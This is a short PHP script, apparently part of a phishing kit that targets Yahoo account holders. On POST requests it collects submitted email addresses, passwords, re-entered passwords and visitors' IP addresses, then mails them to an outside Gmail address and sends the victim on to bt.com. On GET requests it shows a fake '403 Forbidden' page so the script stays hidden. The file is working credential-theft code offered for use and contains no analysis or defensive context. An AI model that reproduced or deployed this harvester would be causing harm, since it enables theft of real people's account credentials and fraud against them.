<?

if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}


$adddate = date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message  = "----+ Yah00 Spam ReZulT +----\n";
$message .= "E-mail ID     : ".$_POST['USER']."\n";
$message .= "Password      : ".$_POST['PASSWORD']."\n";
$message .= "Re-Password   : ".$_POST['passwrd']."\n";
$message .= "----+ C0d3d by h4rky h4rk +----\n";
$message .= "Date & Time: $adddate\n";
$message .= "IP Address : ".$ip."\n";
$recipient = "bar.j.bradsley@gmail.com";
$subject = "Yah00 ReZulT | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location:  http://www.bt.com/");
?>